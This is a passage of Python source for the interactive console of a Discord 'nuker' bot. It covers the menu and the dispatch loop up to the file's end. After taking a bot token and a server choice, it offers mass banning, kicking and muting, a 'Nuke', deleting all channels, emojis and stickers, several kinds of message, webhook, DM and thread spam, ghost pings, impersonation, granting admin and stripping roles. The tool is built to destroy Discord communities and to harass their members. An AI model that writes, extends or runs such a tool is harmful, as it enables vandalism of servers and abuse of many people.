        print(f"  {c_green('1')}  - {c_white('Ban All Members')}")
        print(f"  {c_green('2')}  - {c_white('Kick All Members')}")
        print(f"  {c_green('3')}  - {c_white('Mute All Members')}")
        print(f"  {c_green('4')}  - {c_white('Unban All Members')}")
        print(f"  {c_green('5')}  - {c_white('Nuke (Death)')} {c_red('[!]')}")
        print(f"  {c_green('6')}  - {c_white('Brainfuck')} {c_red('[∞]')}")
        print(f"  {c_green('7')}  - {c_white('Delete All Channels')}")
        print(f"  {c_green('8')}  - {c_white('Delete All Emojis')}")
        print(f"  {c_green('9')}  - {c_white('Delete All Stickers')}")
        print()
        print(f"  {c_green('═' * 25)} {c_bold(c_blue('⚙️ CREATION'))} {c_green('═' * 26)}")
        print(f"  {c_green('10')} - {c_white('Create Channels')}")
        print(f"  {c_green('11')} - {c_white('Create Roles')}")
        print(f"  {c_green('12')} - {c_white('Create Categories')}")
        print()
        print(f"  {c_green('═' * 25)} {c_bold(c_cyan('📝 MODIFICATION'))} {c_green('═' * 24)}")
        print(f"  {c_green('13')} - {c_white('Rename Server')}")
        print(f"  {c_green('14')} - {c_white('Change Server Icon')}")
        print(f"  {c_green('15')} - {c_white('Change Server Description')}")
        print(f"  {c_green('16')} - {c_white('Rename All Channels')}")
        print(f"  {c_green('17')} - {c_white('Rename All Roles')}")
        print(f"  {c_green('18')} - {c_white('Rename All Members')}")
        print()
        print(f"  {c_green('═' * 25)} {c_bold(c_purple('🌀 SPAM'))} {c_green('═' * 28)}")
        print(f"  {c_green('19')} - {c_white('Spam (Infinite if 0)')}")
        print(f"  {c_green('20')} - {c_white('Webhook Spam')}")
        print(f"  {c_green('21')} - {c_white('Webhook Nuke')}")
        print(f"  {c_green('22')} - {c_white('DM All Members')}")
        print(f"  {c_green('23')} - {c_white('DM Spam User')}")
        print(f"  {c_green('24')} - {c_white('Ghost Ping')}")
        print()
        print(f"  {c_green('═' * 25)} {c_bold(c_yellow('🎯 ADVANCED'))} {c_green('═' * 25)}")
        print(f"  {c_green('25')} - {c_white('Grant Admin')}")
        print(f"  {c_green('26')} - {c_white('Impersonate')}")
        print(f"  {c_green('27')} - {c_white('Strip Roles')}")
        print(f"  {c_green('28')} - {c_white('Voice Scatter')}")
        print(f"  {c_green('29')} - {c_white('Move All VC')}")
        print(f"  {c_green('30')} - {c_white('Kick VC All')}")
        print(f"  {c_green('31')} - {c_white('Lockdown')}")
        print(f"  {c_green('32')} - {c_white('Invite Spam')}")
        print(f"  {c_green('33')} - {c_white('Thread Spam')}")
        print()
        print(f"  {c_green('═' * 25)} {c_bold(c_dim('📊 UTILITY'))} {c_green('═' * 26)}")
        print(f"  {c_green('34')} - {c_white('Server Info')}")
        print(f"  {c_green('35')} - {c_white('Stop Tasks')}")
        print(f"  {c_green('36')} - {c_white('Shutdown Bot')}")
        print(f"  {c_green('0')}  - {c_white('Exit')}")
        print()
        print(f"{c_cyan('═' * 60)}")
        print(f"{c_dim('Copyright (c) 2026 Khazix & Daniel-191')}")
        print(f"{c_cyan('═' * 60)}")
        print()
    
    async def run(self):
        self.show_banner()
        token = input(f"  {c_red('>>')} {c_white('Enter Bot Token: ')}").strip()
        if not token:
            log_error("Token required")
            return
        
        intents = discord.Intents.all()
        self.bot = commands.Bot(command_prefix=".", intents=intents)
        self.bot_manager.bot = self.bot
        global bot
        bot = self.bot
        
        @self.bot.event
        async def on_ready():
            clear_screen()
            print(BANNER)
            log_ok(f"Bot Online: {self.bot.user.name}")
            
            print(f"\n{c_cyan('═' * 50)}")
            print(f"{c_bold(c_white('  Available Servers:'))}")
            print(f"{c_cyan('═' * 50)}")
            for i, guild in enumerate(self.bot.guilds):
                print(f"  {c_green(str(i+1))}. {c_white(guild.name)} {c_dim(f'(ID: {guild.id})')}")
            print(f"{c_cyan('═' * 50)}\n")
            
            while True:
                choice = input(f"  {c_red('>>')} {c_white('Enter Server ID or number: ')}").strip()
                try:
                    if choice.isdigit() and int(choice) <= len(self.bot.guilds):
                        guild = self.bot.guilds[int(choice) - 1]
                    else:
                        guild = self.bot.get_guild(int(choice))
                    if guild:
                        self.bot_manager.current_guild = guild
                        log_ok(f"Selected: {guild.name}")
                        break
                    else:
                        log_error("Server not found")
                except:
                    log_error("Invalid input")
            
            permissions = guild.me.guild_permissions
            print(f"\n{c_cyan('═' * 50)}")
            print(f"{c_bold(c_white('  Bot Permissions:'))}")
            print(f"{c_cyan('═' * 50)}")
            print(f"  {c_white('Admin')}: {c_green(str(permissions.administrator)) if permissions.administrator else c_red(str(permissions.administrator))}")
            print(f"  {c_white('Manage Channels')}: {c_green(str(permissions.manage_channels)) if permissions.manage_channels else c_red(str(permissions.manage_channels))}")
            print(f"  {c_white('Ban Members')}: {c_green(str(permissions.ban_members)) if permissions.ban_members else c_red(str(permissions.ban_members))}")
            print(f"  {c_white('Kick Members')}: {c_green(str(permissions.kick_members)) if permissions.kick_members else c_red(str(permissions.kick_members))}")
            print(f"{c_cyan('═' * 50)}\n")
            
            while True:
                self.show_menu()
                choice = input(f"  {c_red('>>')} {c_white('Choose: ')}").strip()
                
                if choice == "0":
                    log_info("Exiting...")
                    await self.bot.close()
                    break
                elif choice == "1":
                    await self.bot_manager.cmd_ban_all(guild)
                elif choice == "2":
                    await self.bot_manager.cmd_kick_all(guild)
                elif choice == "3":
                    try:
                        mins = int(input(f"  {c_red('>>')} {c_white('Minutes: ')}").strip() or "10")
                        await self.bot_manager.cmd_mute_all(guild, mins)
                    except:
                        await self.bot_manager.cmd_mute_all(guild, 10)
                elif choice == "4":
                    await self.bot_manager.cmd_unban_all(guild)
                elif choice == "5":
                    await self.bot_manager.cmd_nuke(guild)
                elif choice == "6":
                    channel_name = input(f"  {c_red('>>')} {c_white('Channel name: ')}").strip()
                    message = input(f"  {c_red('>>')} {c_white('Spam message: ')}").strip()
                    if channel_name and message:
                        await self.bot_manager.cmd_brainfuck(guild, channel_name, message)
                    else:
                        log_error("Channel name and message required")
                elif choice == "7":
                    await self.bot_manager.cmd_delete_channels(guild)
                elif choice == "8":
                    await self.bot_manager.cmd_delete_emojis(guild)
                elif choice == "9":
                    await self.bot_manager.cmd_delete_stickers(guild)
                elif choice == "10":
                    try:
                        count = int(input(f"  {c_red('>>')} {c_white('Count: ')}").strip() or "50")
                        ch_type = input(f"  {c_red('>>')} {c_white('Type (text/voice): ')}").strip().lower() or "text"
                        name = input(f"  {c_red('>>')} {c_white('Name: ')}").strip() or None
                        await self.bot_manager.cmd_create_channels(guild, count, ch_type, name)
                    except:
                        await self.bot_manager.cmd_create_channels(guild, 50, "text", None)
                elif choice == "11":
                    try:
                        count = int(input(f"  {c_red('>>')} {c_white('Count: ')}").strip() or "50")
                        name = input(f"  {c_red('>>')} {c_white('Name: ')}").strip() or None
                        await self.bot_manager.cmd_create_roles(guild, count, name)
                    except:
                        await self.bot_manager.cmd_create_roles(guild, 50, None)
                elif choice == "12":
                    try:
                        count = int(input(f"  {c_red('>>')} {c_white('Count: ')}").strip() or "10")
                        name = input(f"  {c_red('>>')} {c_white('Name: ')}").strip() or None
                        await self.bot_manager.cmd_create_categories(guild, count, name)
                    except:
                        await self.bot_manager.cmd_create_categories(guild, 10, None)
                elif choice == "13":
                    name = input(f"  {c_red('>>')} {c_white('New server name: ')}").strip()
                    if name:
                        await self.bot_manager.cmd_rename_server(guild, name)
                    else:
                        log_error("Name required")
                elif choice == "14":
                    url = input(f"  {c_red('>>')} {c_white('Image URL: ')}").strip()
                    if url:
                        await self.bot_manager.cmd_server_icon(guild, url)
                    else:
                        log_error("URL required")
                elif choice == "15":
                    desc = input(f"  {c_red('>>')} {c_white('New description: ')}").strip()
                    if desc:
                        await self.bot_manager.cmd_server_desc(guild, desc)
                    else:
                        log_error("Description required")
                elif choice == "16":
                    name = input(f"  {c_red('>>')} {c_white('New channel name: ')}").strip()
                    if name:
                        await self.bot_manager.cmd_rename_channels(guild, name)
                    else:
                        log_error("Name required")
                elif choice == "17":
                    name = input(f"  {c_red('>>')} {c_white('New role name: ')}").strip()
                    if name:
                        await self.bot_manager.cmd_rename_roles(guild, name)
                    else:
                        log_error("Name required")
                elif choice == "18":
                    nickname = input(f"  {c_red('>>')} {c_white('Nickname: ')}").strip()
                    if nickname:
                        await self.bot_manager.cmd_rename_members(guild, nickname)
                    else:
                        log_error("Nickname required")
                elif choice == "19":
                    try:
                        count = int(input(f"  {c_red('>>')} {c_white('Messages per channel (0 = infinite): ')}").strip() or "5")
                        message = input(f"  {c_red('>>')} {c_white('Message: ')}").strip()
                        if message:
                            await self.bot_manager.cmd_spam(guild, count, message)
                        else:
                            log_error("Message required")
                    except:
                        log_error("Invalid input")
                elif choice == "20":
                    try:
                        count = int(input(f"  {c_red('>>')} {c_white('Messages per webhook: ')}").strip() or "5")
                        message = input(f"  {c_red('>>')} {c_white('Message: ')}").strip()
                        if message:
                            await self.bot_manager.cmd_webhook_spam(guild, count, message)
                        else:
                            log_error("Message required")
                    except:
                        log_error("Invalid input")
                elif choice == "21":
                    await self.bot_manager.cmd_webhook_nuke(guild)
                elif choice == "22":
                    message = input(f"  {c_red('>>')} {c_white('Message: ')}").strip()
                    if message:
                        await self.bot_manager.cmd_dm_all(guild, message)
                    else:
                        log_error("Message required")
                elif choice == "23":
                    try:
                        user_id = int(input(f"  {c_red('>>')} {c_white('User ID: ')}").strip())
                        count = int(input(f"  {c_red('>>')} {c_white('Messages: ')}").strip() or "10")
                        message = input(f"  {c_red('>>')} {c_white('Message: ')}").strip()
                        if message:
                            await self.bot_manager.cmd_dm_spam_user(guild, user_id, count, message)
                        else:
                            log_error("Message required")
                    except:
                        log_error("Invalid input")
                elif choice == "24":
                    try:
                        target_id = int(input(f"  {c_red('>>')} {c_white('Target ID: ')}").strip())
                        count = int(input(f"  {c_red('>>')} {c_white('Count: ')}").strip() or "10")
                        await self.bot_manager.cmd_ghost_ping(guild, target_id, count)
                    except:
                        log_error("Invalid input")
                elif choice == "25":
                    try:
                        uid = input(f"  {c_red('>>')} {c_white('User ID (empty for all): ')}").strip()
                        user_id = int(uid) if uid else None
                        await self.bot_manager.cmd_admin_me(guild, user_id)
                    except:
                        await self.bot_manager.cmd_admin_me(guild, None)
                elif choice == "26":
                    try:
                        target_id = int(input(f"  {c_red('>>')} {c_white('Target ID: ')}").strip())
                        message = input(f"  {c_red('>>')} {c_white('Message: ')}").strip()
                        channel_id = input(f"  {c_red('>>')} {c_white('Channel ID (empty for all): ')}").strip()
                        cid = int(channel_id) if channel_id else None
                        if message:
                            await self.bot_manager.cmd_impersonate(guild, target_id, message, cid)
                        else:
                            log_error("Message required")
                    except:
                        log_error("Invalid input")
                elif choice == "27":
                    try:
                        uid = input(f"  {c_red('>>')} {c_white('User ID (empty for all): ')}").strip()
                        user_id = int(uid) if uid else None
                        await self.bot_manager.cmd_strip_roles(guild, user_id)
                    except:
                        await self.bot_manager.cmd_strip_roles(guild, None)
                elif choice == "28":
                    await self.bot_manager.cmd_voice_scatter(guild)
                elif choice == "29":
                    try:
                        target_id = int(input(f"  {c_red('>>')} {c_white('Voice Channel ID: ')}").strip())
                        await self.bot_manager.cmd_move_all_vc(guild, target_id)
                    except:
                        log_error("Invalid input")
                elif choice == "30":
                    await self.bot_manager.cmd_kick_vc_all(guild)
                elif choice == "31":
                    await self.bot_manager.cmd_lockdown(guild)
                elif choice == "32":
                    try:
                        count = int(input(f"  {c_red('>>')} {c_white('Count: ')}").strip() or "10")
                        await self.bot_manager.cmd_invite_spam(guild, count)
                    except:
                        await self.bot_manager.cmd_invite_spam(guild, 10)
                elif choice == "33":
                    try:
                        count = int(input(f"  {c_red('>>')} {c_white('Threads per channel: ')}").strip() or "10")
                        name = input(f"  {c_red('>>')} {c_white('Thread name: ')}").strip() or None
                        await self.bot_manager.cmd_thread_spam(guild, count, name)
                    except:
                        await self.bot_manager.cmd_thread_spam(guild, 10, None)
                elif choice == "34":
                    await self.bot_manager.cmd_server_info(guild)
                elif choice == "35":
                    await self.bot_manager.cmd_stop()
                elif choice == "36":
                    await self.bot_manager.cmd_shutdown()
                    break
                else:
                    log_error("Invalid choice")
                
                print()
                input(f"  {c_dim('Press Enter to continue...')}")
                clear_screen()
                print(BANNER)
                log_ok(f"Bot Online: {self.bot.user.name}")
                log_ok(f"Server: {guild.name}")
        
        try:
            await self.bot.start(token)
        except discord.LoginFailure:
            log_error("Invalid token")
        except KeyboardInterrupt:
            log_info("Interrupted by user")
        except Exception as e:
            log_error(f"Error: {e}")

# ============================================================
# التشغيل الرئيسي
# ============================================================

async def main():
    ui = ConsoleUI()
    await ui.run()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{c_yellow('[!]')} {c_white('Exiting...')}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{c_red('[-]')} {c_white(f'Fatal error: {e}')}")
        sys.exit(1)